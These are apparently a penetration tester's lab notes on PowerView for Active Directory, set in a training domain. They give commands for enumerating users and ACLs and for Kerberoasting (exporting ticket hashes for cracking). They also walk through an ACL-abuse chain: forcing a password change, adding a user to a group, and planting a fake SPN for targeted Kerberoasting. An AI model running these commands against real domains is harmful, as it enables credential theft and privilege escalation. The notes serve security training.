---
tags:
  - windows
  - powershell
  - password-policy
  - kerberoasting
  - acl-abuse
  - reversible-encryption
---
# [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) (by PowerShell Mafia)
PowerView is a tool written in PowerShell which, much like BloodHound, provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more.
## Useful Commands
| **Command**                                                                                                                                | **Description**                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
| `Export-PowerViewCSV`                                                                                                                      | Append results to a CSV file                                                                         |
| `ConvertTo-SID`                                                                                                                            | Convert a User, group name, GUID, etc to its SID value                                               |
| [[#Convert-NameToSID]]                                                                                                                     | Convert a user or a group to its SID value                                                           |
| `Get-DomainSPNTicket`                                                                                                                      | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account                    |
| **Domain/LDAP Functions:**                                                                                                                 |                                                                                                      |
| `Get-Domain`                                                                                                                               | Will return the AD object for the current (or specified) domain                                      |
| `Get-DomainController`                                                                                                                     | Return a list of the Domain Controllers for the specified domain                                     |
| [[#[Get-DomainUser](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/)\|Get-DomainUser]]                                  | Will return all users or specific user objects in AD                                                 |
| `Get-DomainComputer`                                                                                                                       | Will return all computers or specific computer objects in AD                                         |
| [[#[Get-DomainGroup](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/)\|Get-DomainGroup]]                               | Will return all groups or specific group objects in AD                                               |
| [[#[Get-DomainObjectACL](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)\|Get-DomainObjectACL]]                   | Retrieve ACLs associated with a specific AD object                                                   |
| `Get-DomainOU`                                                                                                                             | Search for all or specific OU objects in AD                                                          |
| [[#[Find-InterestingDomainAcl](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainAcl/)\|Find-InterestingDomainACL]] | Finds object ACLs in the domain with modification rights set to non-built in objects                 |
| [[#[Get-DomainGroupMember](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/)\|Get-DomainGroupMember]]             | Will return the members of a specific domain group                                                   |
| `Get-DomainFileServer`                                                                                                                     | Returns a list of servers likely functioning as file servers                                         |
| `Get-DomainDFSShare`                                                                                                                       | Returns a list of all distributed file systems for the current (or specified) domain                 |
| [[#[Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/)\|Set-DomainUserPassword]]          | Sets the password for a given user identity                                                          |
| [[#[Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)\|Set-DomainObject]]                            | Modifies a gven property for a specified active directory object                                     |
| [[#[Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/)\|Add-DomainGroupMember]]             | Adds a domain user (or group) to an existing domain group, assuming appropriate permissions to do so |
| **GPO Functions:**                                                                                                                         |                                                                                                      |
| `Get-DomainGPO`                                                                                                                            | Will return all GPOs or specific GPO objects in AD                                                   |
| [[#[Get-DomainPolicy](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainPolicy/)\|Get-DomainPolicy]]                            | Returns the default domain policy or the domain controller policy for the current domain             |
| **Computer Enumeration Functions:**                                                                                                        |                                                                                                      |
| `Get-NetLocalGroup`                                                                                                                        | Enumerates local groups on the local or a remote machine                                             |
| `Get-NetLocalGroupMember`                                                                                                                  | Enumerates members of a specific local group                                                         |
| `Get-NetShare`                                                                                                                             | Returns open shares on the local (or a remote) machine                                               |
| `Get-NetSession`                                                                                                                           | Will return session information for the local (or a remote) machine                                  |
| [[#[Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/)\|Test-AdminAccess]]                            | Tests if the current user has administrative access to the local (or a remote) machine               |
| **Threaded 'Meta'-Functions:**                                                                                                             |                                                                                                      |
| `Find-DomainUserLocation`                                                                                                                  | Finds machines where specific users are logged in                                                    |
| `Find-DomainShare`                                                                                                                         | Finds reachable shares on domain machines                                                            |
| `Find-InterestingDomainShareFile`                                                                                                          | Searches for files matching specific criteria on readable shares in the domain                       |
| `Find-LocalAdminAccess`                                                                                                                    | Find machines on the local domain where the current user has local administrator access              |
| **Domain Trust Functions:**                                                                                                                |                                                                                                      |
| `Get-DomainTrust`                                                                                                                          | Returns domain trusts for the current domain or a specified domain                                   |
| `Get-ForestTrust`                                                                                                                          | Returns all forest trusts for the current forest or a specified forest                               |
| `Get-DomainForeignUser`                                                                                                                    | Enumerates users who are in groups outside of the user's domain                                      |
| `Get-DomainForeignGroupMember`                                                                                                             | Enumerates groups with users outside of the group's domain and returns each foreign member           |
| [[#[Get-DomainTrustMapping](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrustMapping/)\|Get-DomainTrustMapping]]          | Will enumerate all trusts for the current domain and any others seen                                 |
## [Get-DomainPolicy](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainPolicy/)
Can be used to find password policy.
```powershell
PS > Get-DomainPolicy
```
## [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/)
This provides information on all users or specific users we specify
```powershell
PS > Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
- `SPN` attribute on accounts could indicate that the account may be subject to a Kerberoasting attack.
```powershell
PS > Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
- Check for accounts with reversible encryption enabled:
```powershell
PS > Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```
## Kerberoasting
- Get a user's TGS Ticket in [[Hashcat]] format:
```powershell
PS > Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
- Get all TGS Tickets in `CSV`:
```powershell
PS > Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
## [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/)
It retrieves group-specific information. The `-Recurse` switch finds any groups that are part of the target group (nested group membership) to list out the members of those groups.
```powershell
PS >  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
## [Get-DomainTrustMapping](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrustMapping/)
Find domain trust mapping similar to ActiveDirectory PS Module
```powershell
PS > Get-DomainTrustMapping
```
## [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/)
Used to test local admin access on current or a remote  machine.
```powershell
PS > Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
Determines whether the current user is local admin on host `ACADEMY-EA-MS01` or not
## ACL Enumeration
[[Live Off the Land#ACL Enumeration|> Live Off the Land]]
### Convert-NameToSID
```powershell
PS > $sid = Convert-NameToSid "wley"
```
### [Get-DomainObjectACL](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)
>Searching without the `ResolveGUIDs` flag, `ObjectAceType` returns non human-readable GUID which makes an ACE entry unclear under that specific `ActiveDirectoryRights`
```powershell
PS > Get-DomainObjectACL [-ResolveGUIDs] -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```
>Use `*` to search all ACLs, otherwise use `USER` or `GROUP` to find ACL entries on a specific user or group.

We can see that user `wley` has control over `damundsen` via the `User-Force-Change-Password` extended right. We can repeat this with `damundsen` to further hunt for controls.
```powershell
PS > $sid2 = Convert-NameToSid damundsen
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```
And we would find that `damundsen` has `GenericWrite` privileges over `Help Desk Level 1` group. So we can add any users to this group!
### [Get-DomainGroup](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/)
We shoulf find if the group `Help Desk Level 1` is nested or not, since parent group memberships will get inherited to children.
```powershell
PS > Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
---------
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```
Similarly, `Information Technology` group has `GenericAll` rights over `adunn` which means we could:
- Modify group membership
- Force change a password
- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
Again seeing ACL for `adunn` we find that `adunn` has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain object. This means that this user can be leveraged to perform a DCSync attack.
## [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/)
```powershell
PS > Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $wleyCred -Verbose
```
## [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/)
Add/Remove Domain users/group from a group:
```powershell
PS > Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $damundsenCred -Verbose
PS > Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $damundsenCred -Verbose
```

## [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)
This can create a fake SPN (given we have the right to do so)
```powershell
PS > Set-DomainObject -Credential $damundsenCred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
Once we create an SPN, we can Kerberoast using any method: [[Rubeus#Kerberoasting|Rubeus]], etc.
Don't forget to remove the fake SPN, then the user from group and finally reverting the password!
```powershell
PS > Set-DomainObject -Credential $damundsenCred -Identity adunn -Clear serviceprincipalname -Verbose
```
>**NOTE:** The above will remove all SPNs!
```powershell
PS > Set-DomainObject -Credential $damundsenCred -Identity adunn -Remove @{'serviceprincipalname'='notahacker/LEGIT'} -Verbose
```
## [Find-InterestingDomainAcl](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainAcl/)
```powershell
PS > Find-InterestingDomainAcl
```
This gives too much info to sift through
# [PowerView](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1) (by "Empire 4")
The BC-SECURITY version of [PowerView](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) has some new functions such as `Get-NetGmsa`, used to hunt for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview).